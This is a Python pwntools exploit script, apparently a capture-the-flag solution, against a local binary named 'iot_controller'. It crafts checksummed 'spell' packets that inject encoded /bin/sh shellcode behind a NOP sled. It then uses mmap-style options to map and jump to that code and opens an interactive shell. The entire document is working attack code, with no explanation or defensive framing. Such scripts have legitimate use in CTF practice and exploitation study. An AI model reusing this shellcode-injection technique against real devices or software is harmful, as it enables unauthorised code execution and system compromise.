from pwn import *
import struct
context.log_level="debug"
context.arch="amd64"
sh=process("./iot_controller")
def calculate_checksum(data,length):
    rest=length%4
    if rest!=0:
        data+=b'\x00'*(4-rest)
        length+=4-rest
    count=0
    checksum=0
    while(1):
        if count==length:
            break
        print(data[count:count+4])
        checksum+=struct.unpack("!I", data[count:count+4])[0]
        checksum&=0xffffffff
        count+=4
        # success("checksum:"+hex(checksum))
    return checksum
def pack_spell(option,addr_low,addr_high,mmap_addr,mmap_length):
    spell_raw=p8(1)+p8(0)
    spell_raw+=p8(option)+p8(0)
    spell_raw+=p16(0) #length
    spell_raw+=p16(0) #unkonw
    spell_raw+=p32(0) #int8
    spell_raw+=p32(0xFD7C6B5A) #checksum
    spell_raw+=p32(addr_low)
    spell_raw+=p32(addr_high)
    spell_raw+=p64(mmap_addr)
    spell_raw+=p64(0)
    spell_raw+=p64(mmap_length)
    length=len(spell_raw)-0x10

    spell_middle=struct.pack("!ccccHHI",b'\x01',b'\x00',option.to_bytes(1, "little"),b'\x00',length,0,0)
    spell_middle+=p32(0xFD7C6B5A)
    spell_middle+=struct.pack("IIQQQ",addr_low,addr_high,mmap_addr,0,mmap_length)
    if length!=len(spell_middle)-0x10:
        print(length)
        print(len(spell_middle)-0x10)
        error("length err!")
    checksum=calculate_checksum(spell_middle,length+0x10)

    spell_final=struct.pack("!ccccHHII",b'\x01',b'\x00',option.to_bytes(1, "little"),b'\x00',length,0,0,checksum)
    spell_final+=struct.pack("IIQQQ",addr_low,addr_high,mmap_addr,0,mmap_length)
    return spell_final

def pack_shellcode(shellcode):
    option=9
    spell_raw=p8(1)+p8(0)
    spell_raw+=p8(option)+p8(0)
    spell_raw+=p16(0) #length
    spell_raw+=p16(0) #unkonw
    spell_raw+=p32(0) #int8
    spell_raw+=p32(0xFD7C6B5A) #checksum
    spell_raw+=shellcode
    # spell_raw+=p32(addr_low)
    # spell_raw+=p32(addr_high)
    # spell_raw+=p64(mmap_addr)
    # spell_raw+=p64(0)
    # spell_raw+=p64(mmap_length)
    length=len(spell_raw)-0x10-0x30 
    print(length)
    spell_middle=struct.pack("!ccccHHI",b'\x01',b'\x00',option.to_bytes(1, "little"),b'\x00',length,0,0)
    spell_middle+=p32(0xFD7C6B5A)
    spell_middle+=shellcode
    if length!=len(spell_middle)-0x10-0x30:
        print(length)
        print(len(spell_middle)-0x10)
        error("length err!")
    checksum=calculate_checksum(spell_middle,length+0x10)
    spell_final=struct.pack("!ccccHHII",b'\x01',b'\x00',option.to_bytes(1, "little"),b'\x00',length,0,0,checksum)
    spell_final+=shellcode
    return spell_final

spell_1=p8(1)+p8(0)
spell_1+=p8(1)+p8(0) #change num to 2

spell_2=p8(1)+p8(0)
spell_2+=p8(1)+p8(0) #change num to 3

shellcode=encoders.encoder.encode(asm(shellcraft.sh()),b'\x00\x01\x02\x20')
shellcode=shellcode.ljust(0xa0,b'\x90')
spell_3=pack_shellcode(shellcode)
spell_4=pack_spell(4, 0, 0, 0x7f12345000, 0x1000)
spell_5=pack_spell(20, 0x12345000, 0x7f, 0, 0)

payload=spell_1+spell_2+spell_3
payload_length=len(payload)
sh.sendafter(b"Please enter the length of your spell>", str(payload_length).encode().rjust(8,b'0'))

sh.sendafter(b"> ", payload)


payload=spell_1+spell_2+spell_4+spell_5
payload_length=len(payload)
sh.sendafter(b"Please enter the length of your spell>", str(payload_length).encode().rjust(8,b'0'))
# gdb.attach(sh,"b *$rebase(0x25D3)\nc")
# pause()
sh.sendafter(b"> ", payload)

sh.interactive()

